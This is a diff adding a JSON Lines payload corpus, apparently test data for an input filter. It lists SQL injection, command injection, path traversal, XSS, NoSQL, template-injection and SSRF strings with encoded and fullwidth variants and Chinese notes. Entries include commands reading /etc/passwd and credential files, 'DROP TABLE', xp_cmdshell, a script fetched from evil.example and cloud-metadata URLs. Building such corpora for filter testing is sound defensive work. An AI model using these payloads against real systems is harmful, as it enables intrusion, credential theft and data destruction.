@@ -1,0 +1,154 @@
+{"id": "atk-sqli-01", "class": "sqli", "text": "' OR 1=1--", "quick": true, "note": "基础形式：永真条件"}
+{"id": "atk-sqli-02", "class": "sqli", "text": "' or 1=1--", "quick": false, "note": "小写"}
+{"id": "atk-sqli-03", "class": "sqli", "text": "' Or '1'='1", "quick": false, "note": "大小写混写"}
+{"id": "atk-sqli-04", "class": "sqli", "text": "' OR '1'='1'--", "quick": true, "note": "基础形式：字符串永真"}
+{"id": "atk-sqli-05", "class": "sqli", "text": "1' UNION SELECT NULL,NULL--", "quick": true, "note": "基础形式：联合查询"}
+{"id": "atk-sqli-06", "class": "sqli", "text": "1'/**/UNION/**/SELECT/**/NULL,NULL--", "quick": false, "note": "注释代替空格"}
+{"id": "atk-sqli-07", "class": "sqli", "text": "1' UnIoN SeLeCt NULL,NULL--", "quick": false, "note": "大小写混写的联合查询"}
+{"id": "atk-sqli-08", "class": "sqli", "text": "%27%20OR%201%3D1--", "quick": true, "note": "URL 编码"}
+{"id": "atk-sqli-09", "class": "sqli", "text": "%2527%2520OR%25201%253D1--", "quick": false, "note": "双重 URL 编码"}
+{"id": "atk-sqli-10", "class": "sqli", "text": "＇　ＯＲ　１＝１－－", "quick": false, "note": "全角字符"}
+{"id": "atk-sqli-11", "class": "sqli", "text": "1 AND SLEEP(5)", "quick": false, "note": "时间盲注（数字型）"}
+{"id": "atk-sqli-12", "class": "sqli", "text": "' OR SLEEP(5)#", "quick": true, "note": "时间盲注（字符型）"}
+{"id": "atk-sqli-13", "class": "sqli", "text": "1; SELECT pg_sleep(5)--", "quick": false, "note": "堆叠查询加延时"}
+{"id": "atk-sqli-14", "class": "sqli", "text": "'; DROP TABLE patients;--", "quick": false, "note": "堆叠查询"}
+{"id": "atk-sqli-15", "class": "sqli", "text": "' AND 1=CONVERT(int,(SELECT @@version))--", "quick": false, "note": "报错型（SQL Server）"}
+{"id": "atk-sqli-16", "class": "sqli", "text": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "quick": false, "note": "报错型（MySQL）"}
+{"id": "atk-sqli-17", "class": "sqli", "text": "admin'--", "quick": false, "note": "注释截断登录"}
+{"id": "atk-sqli-18", "class": "sqli", "text": "') OR ('a'='a", "quick": false, "note": "括号闭合永真"}
+{"id": "atk-sqli-19", "class": "sqli", "text": "1' ORDER BY 10--", "quick": false, "note": "列数探测"}
+{"id": "atk-sqli-20", "class": "sqli", "text": "' UNION SELECT table_name FROM information_schema.tables--", "quick": false, "note": "信息库枚举"}
+{"id": "atk-sqli-21", "class": "sqli", "text": "' HAVING 1=1--", "quick": false, "note": "HAVING 注入"}
+{"id": "atk-sqli-22", "class": "sqli", "text": "'; EXEC xp_cmdshell('whoami')--", "quick": false, "note": "存储过程调用"}
+{"id": "atk-cmd-01", "class": "cmd", "text": "; cat /etc/passwd", "quick": true, "note": "基础形式：分号串接"}
+{"id": "atk-cmd-02", "class": "cmd", "text": "| cat /etc/passwd", "quick": false, "note": "管道串接"}
+{"id": "atk-cmd-03", "class": "cmd", "text": "&& cat /etc/passwd", "quick": false, "note": "与串接"}
+{"id": "atk-cmd-04", "class": "cmd", "text": "`id`", "quick": false, "note": "反引号命令替换"}
+{"id": "atk-cmd-05", "class": "cmd", "text": "$(id)", "quick": true, "note": "命令替换"}
+{"id": "atk-cmd-06", "class": "cmd", "text": "; id", "quick": false, "note": "分号加命令"}
+{"id": "atk-cmd-07", "class": "cmd", "text": "| whoami", "quick": false, "note": "管道加 whoami"}
+{"id": "atk-cmd-08", "class": "cmd", "text": "; ls -la /", "quick": false, "note": "列目录"}
+{"id": "atk-cmd-09", "class": "cmd", "text": ";cat%20/etc/passwd", "quick": false, "note": "URL 编码的空格"}
+{"id": "atk-cmd-10", "class": "cmd", "text": "%3B%20cat%20%2Fetc%2Fpasswd", "quick": true, "note": "URL 编码"}
+{"id": "atk-cmd-11", "class": "cmd", "text": "%253B%2520cat%2520%252Fetc%252Fpasswd", "quick": false, "note": "双重 URL 编码"}
+{"id": "atk-cmd-12", "class": "cmd", "text": "；ｃａｔ /etc/passwd", "quick": false, "note": "全角分号和全角字母"}
+{"id": "atk-cmd-13", "class": "cmd", "text": "; c'a't /etc/passwd", "quick": false, "note": "引号打断命令名"}
+{"id": "atk-cmd-14", "class": "cmd", "text": "; c\\at /etc/passwd", "quick": false, "note": "反斜杠打断命令名"}
+{"id": "atk-cmd-15", "class": "cmd", "text": "$(sleep 5)", "quick": false, "note": "命令替换加延时"}
+{"id": "atk-cmd-16", "class": "cmd", "text": "; sleep 5", "quick": true, "note": "延时探测"}
+{"id": "atk-cmd-17", "class": "cmd", "text": "| ping -c 5 127.0.0.1", "quick": false, "note": "管道加 ping"}
+{"id": "atk-cmd-18", "class": "cmd", "text": "&& uname -a", "quick": false, "note": "与串接读取系统信息"}
+{"id": "atk-cmd-19", "class": "cmd", "text": "; PING -n 5 127.0.0.1", "quick": false, "note": "Windows 风格延时"}
+{"id": "atk-cmd-20", "class": "cmd", "text": "| type C:\\windows\\win.ini", "quick": false, "note": "Windows 读取文件"}
+{"id": "atk-cmd-21", "class": "cmd", "text": "%0a/bin/cat%20/etc/passwd", "quick": false, "note": "URL 编码的换行串接"}
+{"id": "atk-cmd-22", "class": "cmd", "text": ";/bin/cat /etc/passwd", "quick": false, "note": "绝对路径命令"}
+{"id": "atk-traversal-01", "class": "traversal", "text": "../../etc/passwd", "quick": true, "note": "基础形式"}
+{"id": "atk-traversal-02", "class": "traversal", "text": "../../../../etc/passwd", "quick": false, "note": "多层回退"}
+{"id": "atk-traversal-03", "class": "traversal", "text": "/etc/passwd", "quick": true, "note": "绝对路径"}
+{"id": "atk-traversal-04", "class": "traversal", "text": "..%2f..%2fetc%2fpasswd", "quick": true, "note": "URL 编码的斜杠"}
+{"id": "atk-traversal-05", "class": "traversal", "text": "..%252f..%252fetc%252fpasswd", "quick": false, "note": "双重 URL 编码"}
+{"id": "atk-traversal-06", "class": "traversal", "text": "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "quick": false, "note": "编码点号和斜杠"}
+{"id": "atk-traversal-07", "class": "traversal", "text": "%2e%2e/%2e%2e/etc/passwd", "quick": false, "note": "部分编码"}
+{"id": "atk-traversal-08", "class": "traversal", "text": "....//....//etc/passwd", "quick": true, "note": "重复点号绕过过滤"}
+{"id": "atk-traversal-09", "class": "traversal", "text": "..\\..\\windows\\win.ini", "quick": false, "note": "反斜杠（Windows）"}
+{"id": "atk-traversal-10", "class": "traversal", "text": "..%5c..%5cwindows%5cwin.ini", "quick": false, "note": "URL 编码的反斜杠"}
+{"id": "atk-traversal-11", "class": "traversal", "text": "..／..／etc／passwd", "quick": false, "note": "全角斜杠"}
+{"id": "atk-traversal-12", "class": "traversal", "text": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "quick": false, "note": "非法 UTF-8 编码的点号"}
+{"id": "atk-traversal-13", "class": "traversal", "text": "/var/www/../../etc/shadow", "quick": false, "note": "路径中间回退"}
+{"id": "atk-traversal-14", "class": "traversal", "text": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "quick": false, "note": "Windows 长路径"}
+{"id": "atk-traversal-15", "class": "traversal", "text": "..%00/etc/passwd", "quick": false, "note": "空字节截断"}
+{"id": "atk-traversal-16", "class": "traversal", "text": "/proc/self/environ", "quick": false, "note": "读取进程环境"}
+{"id": "atk-traversal-17", "class": "traversal", "text": "../config/secrets.yml", "quick": false, "note": "相对路径读取配置"}
+{"id": "atk-traversal-18", "class": "traversal", "text": "..%252F..%252Fboot.ini", "quick": false, "note": "双重编码的 Windows 文件"}
+{"id": "atk-traversal-19", "class": "traversal", "text": "/..;/..;/etc/passwd", "quick": false, "note": "分号路径参数"}
+{"id": "atk-traversal-20", "class": "traversal", "text": "%25252e%25252e%25252fetc%25252fpasswd", "quick": false, "note": "三重 URL 编码"}
+{"id": "atk-traversal-21", "class": "traversal", "text": "....\\/....\\/etc/passwd", "quick": false, "note": "混用斜杠"}
+{"id": "atk-traversal-22", "class": "traversal", "text": "/etc/./passwd", "quick": false, "note": "当前目录段"}
+{"id": "atk-xss-01", "class": "xss", "text": "<script>alert(1)</script>", "quick": true, "note": "基础形式"}
+{"id": "atk-xss-02", "class": "xss", "text": "<ScRiPt>alert(1)</sCrIpT>", "quick": false, "note": "大小写混写"}
+{"id": "atk-xss-03", "class": "xss", "text": "<img src=x onerror=alert(1)>", "quick": true, "note": "事件处理器"}
+{"id": "atk-xss-04", "class": "xss", "text": "\"><svg/onload=alert(1)>", "quick": false, "note": "闭合属性后注入"}
+{"id": "atk-xss-05", "class": "xss", "text": "javascript:alert(1)", "quick": true, "note": "伪协议"}
+{"id": "atk-xss-06", "class": "xss", "text": "<body onload=alert(1)>", "quick": false, "note": "body 事件"}
+{"id": "atk-xss-07", "class": "xss", "text": "<iframe src=\"javascript:alert(1)\">", "quick": false, "note": "iframe 伪协议"}
+{"id": "atk-xss-08", "class": "xss", "text": "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "quick": true, "note": "URL 编码"}
+{"id": "atk-xss-09", "class": "xss", "text": "%253Cscript%253Ealert(1)%253C%252Fscript%253E", "quick": false, "note": "双重 URL 编码"}
+{"id": "atk-xss-10", "class": "xss", "text": "＜ｓｃｒｉｐｔ＞alert(1)＜／ｓｃｒｉｐｔ＞", "quick": true, "note": "全角字符"}
+{"id": "atk-xss-11", "class": "xss", "text": "<scr<script>ipt>alert(1)</scr</script>ipt>", "quick": false, "note": "嵌套标签"}
+{"id": "atk-xss-12", "class": "xss", "text": "<svg><animate onbegin=alert(1)>", "quick": false, "note": "SVG 动画事件"}
+{"id": "atk-xss-13", "class": "xss", "text": "<details open ontoggle=alert(1)>", "quick": false, "note": "details 事件"}
+{"id": "atk-xss-14", "class": "xss", "text": "<img/src=x/onerror=alert`1`>", "quick": false, "note": "斜杠代替空格和反引号"}
+{"id": "atk-xss-15", "class": "xss", "text": "'-alert(1)-'", "quick": false, "note": "JS 字符串闭合"}
+{"id": "atk-xss-16", "class": "xss", "text": "<a href=\"javascript:alert(1)\">点我</a>", "quick": false, "note": "链接伪协议"}
+{"id": "atk-xss-17", "class": "xss", "text": "<input autofocus onfocus=alert(1)>", "quick": false, "note": "autofocus 事件"}
+{"id": "atk-xss-18", "class": "xss", "text": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", "quick": false, "note": "嵌套的 MathML"}
+{"id": "atk-xss-19", "class": "xss", "text": "<script src=//evil.example/x.js></script>", "quick": false, "note": "外链脚本"}
+{"id": "atk-xss-20", "class": "xss", "text": "<object data=\"javascript:alert(1)\">", "quick": false, "note": "object 伪协议"}
+{"id": "atk-xss-21", "class": "xss", "text": "<body/onpageshow=alert(1)>", "quick": false, "note": "事件变形"}
+{"id": "atk-xss-22", "class": "xss", "text": "<img src=\"x\" onerror=\"alert(1)\">", "quick": false, "note": "双引号属性"}
+{"id": "atk-nosql-01", "class": "nosql", "text": "{\"$ne\": null}", "quick": true, "note": "基础形式：不等于空"}
+{"id": "atk-nosql-02", "class": "nosql", "text": "{\"$gt\": \"\"}", "quick": true, "note": "大于空字符串"}
+{"id": "atk-nosql-03", "class": "nosql", "text": "{\"$where\": \"sleep(5000)\"}", "quick": false, "note": "$where 延时"}
+{"id": "atk-nosql-04", "class": "nosql", "text": "{\"$regex\": \".*\"}", "quick": false, "note": "正则通配"}
+{"id": "atk-nosql-05", "class": "nosql", "text": "{\"$or\": [{}, {\"a\": 1}]}", "quick": false, "note": "$or 永真"}
+{"id": "atk-nosql-06", "class": "nosql", "text": "{\"$nin\": []}", "quick": false, "note": "$nin 空数组"}
+{"id": "atk-nosql-07", "class": "nosql", "text": "{\"$exists\": true}", "quick": false, "note": "$exists"}
+{"id": "atk-nosql-08", "class": "nosql", "text": "{\"$where\": \"this.password.match(/.*/)\"}", "quick": false, "note": "$where 读取字段"}
+{"id": "atk-nosql-09", "class": "nosql", "text": "username[$ne]=x&password[$ne]=x", "quick": false, "note": "查询串形式的操作符"}
+{"id": "atk-nosql-10", "class": "nosql", "text": "[$ne]=1", "quick": true, "note": "数组形式的操作符"}
+{"id": "atk-nosql-11", "class": "nosql", "text": "%7B%22%24ne%22%3A%20null%7D", "quick": false, "note": "URL 编码的 JSON"}
+{"id": "atk-nosql-12", "class": "nosql", "text": "%257B%2522%2524ne%2522%253A%2520null%257D", "quick": true, "note": "双重 URL 编码的 JSON"}
+{"id": "atk-nosql-13", "class": "nosql", "text": "｛\"＄ne\": null｝", "quick": false, "note": "全角花括号和美元符"}
+{"id": "atk-nosql-14", "class": "nosql", "text": "{\"$lt\": \"z\"}", "quick": false, "note": "$lt 范围"}
+{"id": "atk-nosql-15", "class": "nosql", "text": "{\"$expr\": {\"$gt\": [1, 0]}}", "quick": false, "note": "$expr 表达式"}
+{"id": "atk-nosql-16", "class": "nosql", "text": "{\"$or\": [{\"role\": \"admin\"}]}", "quick": false, "note": "$or 指定角色"}
+{"id": "atk-nosql-17", "class": "nosql", "text": "{\"$in\": [\"admin\", \"root\"]}", "quick": false, "note": "$in 枚举"}
+{"id": "atk-nosql-18", "class": "nosql", "text": "{\"$ne\": 1}", "quick": false, "note": "数字形式"}
+{"id": "atk-nosql-19", "class": "nosql", "text": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "quick": false, "note": "两个字段都带操作符"}
+{"id": "atk-nosql-20", "class": "nosql", "text": "[$regex]=^a", "quick": false, "note": "正则查询串形式"}
+{"id": "atk-nosql-21", "class": "nosql", "text": "{\"$where\": \"function(){return true}\"}", "quick": false, "note": "$where 函数"}
+{"id": "atk-nosql-22", "class": "nosql", "text": "{\"$or\": [{\"a\": {\"$ne\": 1}}]}", "quick": false, "note": "嵌套的操作符"}
+{"id": "atk-ssti-01", "class": "ssti", "text": "{{7*7}}", "quick": true, "note": "基础形式（Jinja、Twig）"}
+{"id": "atk-ssti-02", "class": "ssti", "text": "${7*7}", "quick": true, "note": "基础形式（Freemarker、Velocity 风格）"}
+{"id": "atk-ssti-03", "class": "ssti", "text": "<%= 7*7 %>", "quick": true, "note": "ERB 风格"}
+{"id": "atk-ssti-04", "class": "ssti", "text": "#{7*7}", "quick": false, "note": "Ruby 风格插值"}
+{"id": "atk-ssti-05", "class": "ssti", "text": "{{ config.items() }}", "quick": true, "note": "读取配置"}
+{"id": "atk-ssti-06", "class": "ssti", "text": "{{ ''.__class__.__mro__ }}", "quick": false, "note": "对象遍历"}
+{"id": "atk-ssti-07", "class": "ssti", "text": "{% for c in ''.__class__.__mro__ %}{{ c }}{% endfor %}", "quick": false, "note": "模板循环"}
+{"id": "atk-ssti-08", "class": "ssti", "text": "{{request.application.__globals__}}", "quick": false, "note": "全局变量"}
+{"id": "atk-ssti-09", "class": "ssti", "text": "{{ self.__init__.__globals__ }}", "quick": false, "note": "self 对象"}
+{"id": "atk-ssti-10", "class": "ssti", "text": "${{7*7}}", "quick": false, "note": "双层括号"}
+{"id": "atk-ssti-11", "class": "ssti", "text": "{{7*'7'}}", "quick": false, "note": "字符串乘法指纹"}
+{"id": "atk-ssti-12", "class": "ssti", "text": "*{7*7}", "quick": false, "note": "Thymeleaf 风格"}
+{"id": "atk-ssti-13", "class": "ssti", "text": "%7B%7B7*7%7D%7D", "quick": false, "note": "URL 编码"}
+{"id": "atk-ssti-14", "class": "ssti", "text": "%257B%257B7*7%257D%257D", "quick": false, "note": "双重 URL 编码"}
+{"id": "atk-ssti-15", "class": "ssti", "text": "｛｛７＊７｝｝", "quick": false, "note": "全角花括号和数字"}
+{"id": "atk-ssti-16", "class": "ssti", "text": "{{ 7 * 7 }}", "quick": false, "note": "带空格"}
+{"id": "atk-ssti-17", "class": "ssti", "text": "{{ lipsum.__globals__ }}", "quick": false, "note": "lipsum 全局"}
+{"id": "atk-ssti-18", "class": "ssti", "text": "{{ cycler.__init__.__globals__ }}", "quick": false, "note": "cycler 全局"}
+{"id": "atk-ssti-19", "class": "ssti", "text": "<%= system('id') %>", "quick": false, "note": "ERB 命令调用"}
+{"id": "atk-ssti-20", "class": "ssti", "text": "#{'a'.class.superclass}", "quick": false, "note": "Ruby 对象遍历"}
+{"id": "atk-ssti-21", "class": "ssti", "text": "{{ 'a'.toUpperCase() }}", "quick": false, "note": "JavaScript 表达式"}
+{"id": "atk-ssti-22", "class": "ssti", "text": "{{constructor.constructor('return 7*7')()}}", "quick": false, "note": "原型链表达式"}
+{"id": "atk-ssrf-01", "class": "ssrf", "text": "http://127.0.0.1/admin", "quick": true, "note": "回环地址"}
+{"id": "atk-ssrf-02", "class": "ssrf", "text": "http://localhost:8080/", "quick": false, "note": "localhost"}
+{"id": "atk-ssrf-03", "class": "ssrf", "text": "http://169.254.169.254/latest/meta-data/", "quick": true, "note": "云元数据地址"}
+{"id": "atk-ssrf-04", "class": "ssrf", "text": "http://[::1]/", "quick": false, "note": "IPv6 回环"}
+{"id": "atk-ssrf-05", "class": "ssrf", "text": "http://0.0.0.0:22/", "quick": false, "note": "全零地址"}
+{"id": "atk-ssrf-06", "class": "ssrf", "text": "http://2130706433/", "quick": false, "note": "十进制 IP"}
+{"id": "atk-ssrf-07", "class": "ssrf", "text": "http://0x7f000001/", "quick": true, "note": "十六进制 IP"}
+{"id": "atk-ssrf-08", "class": "ssrf", "text": "http://127.1/", "quick": false, "note": "省略写法"}
+{"id": "atk-ssrf-09", "class": "ssrf", "text": "http://127.0.0.1#@evil.example/", "quick": false, "note": "片段符号混淆"}
+{"id": "atk-ssrf-10", "class": "ssrf", "text": "file:///etc/passwd", "quick": true, "note": "file 协议"}
+{"id": "atk-ssrf-11", "class": "ssrf", "text": "gopher://127.0.0.1:6379/_*1%0d%0a", "quick": false, "note": "gopher 协议"}
+{"id": "atk-ssrf-12", "class": "ssrf", "text": "dict://127.0.0.1:11211/stat", "quick": false, "note": "dict 协议"}
+{"id": "atk-ssrf-13", "class": "ssrf", "text": "HTTP://LOCALHOST/ADMIN", "quick": false, "note": "大小写变形"}
+{"id": "atk-ssrf-14", "class": "ssrf", "text": "%68%74%74%70%3a%2f%2f127.0.0.1%2fadmin", "quick": false, "note": "URL 编码的协议和地址"}
+{"id": "atk-ssrf-15", "class": "ssrf", "text": "%2568%2574%2574%2570%253a%252f%252f127.0.0.1", "quick": false, "note": "双重 URL 编码"}
+{"id": "atk-ssrf-16", "class": "ssrf", "text": "ｈｔｔｐ：／／１２７．０．０．１／", "quick": false, "note": "全角字符"}
+{"id": "atk-ssrf-17", "class": "ssrf", "text": "http://metadata.google.internal/computeMetadata/v1/", "quick": false, "note": "云元数据域名"}
+{"id": "atk-ssrf-18", "class": "ssrf", "text": "http://10.0.0.1/internal/status", "quick": false, "note": "内网地址"}
+{"id": "atk-ssrf-19", "class": "ssrf", "text": "http://192.168.0.1/", "quick": false, "note": "私网地址"}
+{"id": "atk-ssrf-20", "class": "ssrf", "text": "http://[::ffff:127.0.0.1]/", "quick": false, "note": "IPv4 映射的 IPv6"}
+{"id": "atk-ssrf-21", "class": "ssrf", "text": "http://127.0.0.1:6379/", "quick": false, "note": "Redis 端口"}
+{"id": "atk-ssrf-22", "class": "ssrf", "text": "http://127.0.0.1:80@evil.example/", "quick": false, "note": "@ 符号混淆"}
